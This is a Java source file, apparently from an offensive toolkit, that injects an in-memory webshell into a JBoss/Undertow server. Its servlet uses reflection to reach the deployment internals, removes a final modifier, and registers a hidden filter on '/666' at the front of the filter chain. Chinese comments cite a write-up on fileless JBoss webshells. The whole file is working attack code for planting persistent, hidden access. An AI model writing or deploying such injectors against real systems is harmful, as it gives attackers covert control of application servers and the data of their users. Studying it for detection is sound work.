package com.memshell.jboss;

import com.memshell.generic.Util;
import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;
import javax.security.jacc.PolicyContext;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

public class FilterBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 参考：
        // 《Dynamic Servlet Registration》 http://www.mastertheboss.com/javaee/servlet-30/dynamic-servlet-registration
        // 《JBOSS 无文件webshell的技术研究》 https://mp.weixin.qq.com/s/_SQS9B7tkL1H5fMIgPTOKw

        try{
            String filterName = "jbossFilter";
            String urlPattern = "/666";

            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            ServletContext context = request.getServletContext();
            Field f = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);

            //只添加一次
            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
            if(!filters.containsKey(filterName)){
                System.out.println("[+] Add Dynamic Filter");

                Class clazz = Util.getDynamicFilterTemplateClass();
                FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
                deploymentInfo.addFilter(filter);

                f = context.getClass().getDeclaredField("deployment");
                f.setAccessible(true);
                Field modifiersField = Field.class.getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
                deployment.getFilters().addFilter(filter);

                // 0 表示把我们动态注册的 filter 放在第一位
                deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
